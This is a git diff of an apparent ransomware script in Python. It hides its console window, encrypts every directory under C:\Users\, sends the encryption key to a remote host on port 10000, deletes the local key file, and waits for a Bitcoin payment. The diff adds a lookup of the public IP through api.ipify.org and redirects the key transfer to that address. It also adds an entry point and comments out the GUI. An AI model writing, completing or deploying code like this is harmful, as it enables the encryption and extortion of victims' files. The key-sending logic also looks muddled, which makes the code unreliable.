@@ -21,6 +21,7 @@ import socket
 import datetime, sys
 from tkinter import *
 import listen
+from requests import get
 
 
 def listen():
@@ -125,7 +126,8 @@ def send_file(file_name, host, port):
 def main():
         btc_addr = ''
                                                 #hide the console window
-        
+        ip = get('https://api.ipify.org').text
+
         kernel32 = ctypes.WinDLL('kernel32')
         user32 = ctypes.WinDLL('user32')
         SW_HIDE = 0
@@ -142,7 +144,7 @@ def main():
         user = curr_user()
         target_dir = 'C:\\Users\\'
         encrypt_all_dir(target_dir, key)
-        send_file(key_name, '10.0.0.14', 10000)
+        send_file(key_name, ip, 10000)
                                                  #delete the key file
         os.remove(key_name)
         paid = False
@@ -152,7 +154,10 @@ def main():
                 decrypt_all_dir(target_dir, key_name)
 
 
+if __name__ == '__main__':
+    main()
 
+"""
 class GUI:
         def __init__(self, master):
                 self.master = master
@@ -168,7 +173,7 @@ root = Tk()
 root.minsize(width=500, height=500)
 gui = GUI(root)
 root.mainloop()
-
+"""
 
 
 
